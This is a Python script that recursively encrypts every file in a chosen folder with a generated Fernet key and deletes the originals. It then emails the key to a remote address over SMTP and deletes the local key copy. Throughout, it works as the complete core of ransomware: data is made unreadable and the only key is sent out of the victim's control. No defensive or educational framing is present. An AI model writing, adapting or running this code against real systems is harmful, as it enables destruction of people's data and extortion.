import argparse
import os
import smtplib
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from cryptography.fernet import Fernet

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Generate a random encryption key
def generate_key():
    return Fernet.generate_key()

# Encrypt and save the key to a file
def save_key_to_file(key, file_path):
    try:
        with open(file_path, 'wb') as file:
            file.write(key)
        logging.info(f"Encryption key saved to {file_path}")
    except Exception as e:
        logging.error(f"Failed to save encryption key: {e}")

# Load the encryption key from the file
def load_key_from_file(file_path):
    try:
        with open(file_path, 'rb') as file:
            return file.read()
    except Exception as e:
        logging.error(f"Failed to load encryption key: {e}")
        return None

# Encrypt a file using the given key
def encrypt_file(file_path, key):
    cipher_suite = Fernet(key)
    try:
        with open(file_path, 'rb') as file:
            plaintext = file.read()
        encrypted_text = cipher_suite.encrypt(plaintext)
        with open(file_path + '.enc', 'wb') as file:
            file.write(encrypted_text)
        os.remove(file_path)  # Optionally delete the original file after encryption
        logging.info(f"Encrypted {file_path}")
    except Exception as e:
        logging.error(f"Failed to encrypt {file_path}: {e}")

# Send the key via email
def send_email_with_attachment(sender_email, sender_password, receiver_email, subject, body, attachment_file, smtp_server, smtp_port):
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
    except smtplib.SMTPAuthenticationError:
        logging.error("Failed to log in. Check your email and password.")
        return
    except Exception as e:
        logging.error(f"Failed to connect to the SMTP server: {e}")
        return

    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = subject
    message.attach(MIMEText(body, 'plain'))

    try:
        with open(attachment_file, 'rb') as file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment_file)}')
            message.attach(part)
    except Exception as e:
        logging.error(f"Failed to attach the file: {e}")
        return

    try:
        server.sendmail(sender_email, receiver_email, message.as_string())
        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")
    finally:
        server.quit()

def main():
    parser = argparse.ArgumentParser(description="Encrypt files and send the key via email")
    parser.add_argument('-b', '--body', required=True, help='Email body text')
    parser.add_argument('-s', '--sender-email', required=True, help="Sender's email address")
    parser.add_argument('-p', '--sender-password', required=True, help="Sender's email password")
    parser.add_argument('-r', '--receiver-email', required=True, help="Receiver's email address")
    parser.add_argument('-sub', '--subject', required=True, help='Email subject')
    parser.add_argument('--smtp-server', required=True, help='SMTP server address')
    parser.add_argument('--smtp-port', type=int, required=True, help='SMTP server port')
    parser.add_argument('--path', required=True, help='Path to the folder to encrypt')
    args = parser.parse_args()

    body = args.body
    sender_email = args.sender_email
    sender_password = args.sender_password
    receiver_email = args.receiver_email
    subject = args.subject
    smtp_server = args.smtp_server
    smtp_port = args.smtp_port
    folder_to_encrypt = args.path

    encryption_key = generate_key()
    key_file_path = 'encrypted_key.enc'

    save_key_to_file(encryption_key, key_file_path)
    encryption_key = load_key_from_file(key_file_path)
    if not encryption_key:
        logging.error("Encryption key loading failed, exiting.")
        return

    logging.info(f"Encrypting files in {folder_to_encrypt}...")
    for root, _, files in os.walk(folder_to_encrypt):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, encryption_key)

    send_email_with_attachment(sender_email, sender_password, receiver_email, subject, body, key_file_path, smtp_server, smtp_port)

    try:
        os.remove(key_file_path)
        logging.info("Encryption key file deleted successfully.")
    except Exception as e:
        logging.error(f"An error occurred while deleting the key file: {e}")

if __name__ == '__main__':
    main()
